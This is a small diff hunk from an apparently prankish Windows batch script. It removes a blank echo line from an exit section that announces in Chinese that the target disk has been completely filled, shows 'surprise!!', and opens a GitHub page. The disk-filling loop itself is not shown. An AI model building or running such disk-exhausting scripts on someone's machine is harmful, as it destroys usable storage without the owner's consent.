@@ -39,7 +39,6 @@ goto start
 :exit
 cls
 echo 目标磁盘已经被完全填满！
-echo.
 echo surprise！！
 pause
 start https://github.com/MOCBear
